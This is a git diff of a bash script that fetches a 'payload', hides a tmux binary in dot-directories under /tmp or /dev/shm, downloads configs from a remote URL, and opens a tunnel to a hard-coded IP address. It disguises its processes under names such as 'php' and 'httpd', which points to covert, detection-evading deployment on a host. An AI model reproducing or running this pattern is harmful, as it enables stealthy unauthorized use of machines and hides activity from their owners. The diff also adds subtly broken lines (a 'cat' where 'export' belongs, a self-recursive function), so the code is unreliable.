@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 ## get payload
 BRANCH=master
@@ -9,15 +9,18 @@ cd scripts-${BRANCH} || exit 1
 ## relocate tmux
 trel=false
 for ph in {/tmp,/dev/shm,~/}; do
-    mkdir -p ${ph}/.tmux && \
-        mv pl/tmux ${ph}/.tmux && \
-        export PATH=${ph}/.tmux:$PATH && \
-        trel=true && break
+    mkdir -p ${ph}/.tmx && \
+        mv pl/tmux ${ph}/.tmx && \
+        export PATH=${ph}/.tmx:$PATH && \
+        trel=${ph}/.tmx && break
 done
 [ $trel = false ] && { echo "couldn't relocate tmux" ; exit 1; }
 
+## utility vars
+CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
+
 ## needed tmux sed grep envsubst
-export TERMINFO=pl/ \
+cat TERMINFO=pl/ \
        TERM=tmux \
        SHELL=$(/usr/bin/which bash) \
        PATH=.:pl:$PATH \
@@ -25,26 +28,33 @@ export TERMINFO=pl/ \
 [ -z "$SHELL" ] && echo "bash not found" && exit 1
 
 
-## custom socket for tmux
-export tmx=$(which tmux)
-tmux(){
-    $tmx -S /tmp/.tmx "$@"
-}
-export -f tmux
+## custom socket path for tmux
+function tmux(){
+    TMUX_TMPDIR=${trel} tmux "$@"
+} ; export -f tmux
 tmux start-server || { echo "failed to start tmux"; exit 1 ; }
 
 ## glibc not needed on standalone
 ## tnl
 TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
-TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
-TNL_MASK=${TNL_MASK:-gst}
+TNL_CFG=${TNL_CFG:-gst.json}
+TNL_PATH=${TNL_PATH:-$(/usr/bin/which gst)}
+TNL_MASK=${TNL_MASK:-php}
+TNL_CFG_MASK=${TNL_CFG_MASK:-php.ini}
+TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
+## download cfg
+if [ ! -e "$OBJ_CFG" ]; then
+	  wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "${TNL_CFG_MASK}.tpl"
+fi
+## mask and config
+mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
+envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
 tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
 
 
 OBJ_MASK=${OBJ_MASK:-httpd}
 PAUSD_DAEMON=${PAUSD_DAEMON:-pausd}
 OBJ_CFG=${OBJ_CFG:-httpd-1.conf}
-CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
 PAUSD_ARGS=${PAUSD_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf}
 
 ## download cfg
